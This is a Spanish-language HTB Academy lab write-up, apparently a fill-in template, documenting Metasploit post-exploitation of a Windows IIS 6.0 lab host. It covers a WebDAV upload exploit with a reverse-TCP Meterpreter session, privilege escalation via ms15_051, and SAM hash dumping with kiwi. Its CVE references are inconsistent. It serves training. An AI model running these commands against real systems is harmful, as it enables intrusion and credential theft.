---
title: "Explotación Windows - Escalada de Privilegios y Meterpreter"
target: "10.129.203.65 (ACADEMY-MSF2-WIN02)"
platform: "HTB Academy"
date: 2025-12-09 # (o la fecha actual)
tags: 
  - Metasploit
  - Meterpreter
  - PostExplotacion
  - Windows
  - EscaladaDePrivilegios
  - Hashdump
  - Kiwi
estado: "Completado"
cve: "CVE-2017-7269" # El exploit inicial de IIS
toc: true
hide_title_image: true # Añade esta línea
image:
 path: /assets/images/headers/msf6.jpg
toc: true
toc_label: Contenido del Reporte
toc_sticky: true
header:
  overlay_image: /assets/images/headers/msf6.jpg
  overlay_filter: 0.7
og_image: /assets/images/headers/msf6.jpg
---


![Metasploit](/assets/images/headers/msf6.jpg){: .align-center}

## 📄 Metasploit Post-Explotación en Windows: Escalada y Volcado de Credenciales

### 1. ⚙️ Ficha Técnica y Reconocimiento Inicial



|**Componente**|**Detalle**|**Notas**|
|---|---|---|
|**Objetivo (RHOST)**|`10.129.203.65` (ACADEMY-MSF2-WIN02)|Sistema Windows con servicios de IIS.|
|**Atacante (LHOST)**|`[Tu_IP_en_la_VPN]`|IP asignada al adaptador `tun0`.|
|**Servicio Explotado**|Microsoft IIS httpd 6.0 (Puerto 80/TCP)|Confirmado vía `db_nmap -sV`.|
|**Exploit Inicial**|`exploit/windows/iis/iis_webdav_upload_asp`|CVE-2004-xxxx (Acceso RCE/WebDAV)|

### 2. 💥 Fase de Explotación y Acceso Inicial

El objetivo fue comprometido usando una vulnerabilidad de WebDAV en IIS 6.0 que permite la carga y ejecución de archivos `.asp`.

1. **Configuración del Exploit y Payload (Reverse TCP):**
    
    
    ```bash
    msf6 > use exploit/windows/iis/iis_webdav_upload_asp
    msf6 exploit(...) > set RHOST 10.129.203.65
    msf6 exploit(...) > set LHOST [Tu_IP]
    msf6 exploit(...) > run -j # Usamos -j para background la sesión automáticamente
    ```
    
2. **Verificación de la Sesión y Privilegios:**
    
    - Una vez que se establece la conexión, se interactúa con la sesión Meterpreter.
        

    ```bash
    msf6 > sessions -i 1
    meterpreter > getuid
    ```
    
    - **Resultado Obtenido:** `Server username: NT AUTHORITY\NETWORK SERVICE` (O un usuario de bajo privilegio similar).
        

> **ARTIFACTO 1 (Respuesta 1):** El usuario inicial de la sesión fue: **`[Coloca aquí tu primera respuesta]`**

### 3. ⬆️ Fase de Escalada de Privilegios (Privilege Escalation)

Dado que el `getuid` reveló un usuario de bajo nivel (`NETWORK SERVICE`), la extracción de hashes (`hashdump`) falló con el error: `Operation failed: Incorrect function`. Esto confirma la necesidad de elevar los permisos a `NT AUTHORITY\SYSTEM`.

1. **Búsqueda Automatizada de Exploits Locales:**
    
    - Regresamos al _prompt_ de `msf6` y utilizamos el módulo **`local_exploit_suggester`**.
        
    
    
    ```Bash
    meterpreter > background 
    msf6 > use post/multi/recon/local_exploit_suggester
    msf6 post(...) > set SESSION 1
    msf6 post(...) > run
    ```
    
    - **Metodología:** El suggester automatiza el proceso de correlacionar el OS target (ej. Windows 2003 Server) con los exploits de kernel conocidos dentro de la base de datos de Metasploit.
        
2. **Ejecución del Exploit Local:**
    
    - El módulo nos sugiere el exploit `ms15_051_client_copy_image`.
        
    
    ```Bash
    msf6 > use exploit/windows/local/ms15_051_client_copy_image
    msf6 exploit(...) > set SESSION 1
    msf6 exploit(...) > set LHOST [Tu_IP] 
    msf6 exploit(...) > run
    ```
    
    - **Resultado:** Se obtiene una nueva sesión Meterpreter (ej. `sessions 2`).
        
3. **Confirmación de Éxito:**
    
    
    ```Bash
    msf6 > sessions -i 2
    meterpreter > getuid
    ```
    
    - **Resultado Esperado:** `Server username: NT AUTHORITY\SYSTEM` (¡Acceso de administrador total!)
        

### 4. 💰 Fase de Volcado de Credenciales (Looting)

Con el nivel de `SYSTEM`, ahora podemos acceder al **Security Account Manager (SAM)** y extraer los hashes.

1. **Carga de la Extensión `Kiwi` (Mimikatz):**
    
    - Debido a los cambios en las versiones modernas de Metasploit, los comandos avanzados de credenciales (`lsa_dump_sam`) requieren la extensión `kiwi` (basada en la herramienta Mimikatz).
        
    
    ```Bash
    meterpreter > load kiwi
    ```
    
2. **Volcado de Hashes del SAM/LSA:**
    
    - Usamos el comando `hashdump` estándar de Meterpreter (o `kiwi::lsa_dump_sam` si la versión es muy reciente) para obtener las credenciales locales.
        
    ```Bash
    meterpreter > hashdump 
    ```
    
3. **Extracción de la Credencial Requerida:**
    
    - Analizamos la salida, que sigue el formato `Usuario:RID:HashLM:HashNTLM:::`, y buscamos al usuario **htb-student**.
        
    
    **Ejemplo de Salida (`htb-student`):**
    
    ```
    htb-student:1009:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY:::
    ```
    

> **ARTIFACTO 2 (Respuesta 2):** El hash NTLM (YYYY...) para el usuario **`htb-student`** es: **`[Coloca aquí tu segunda respuesta]`**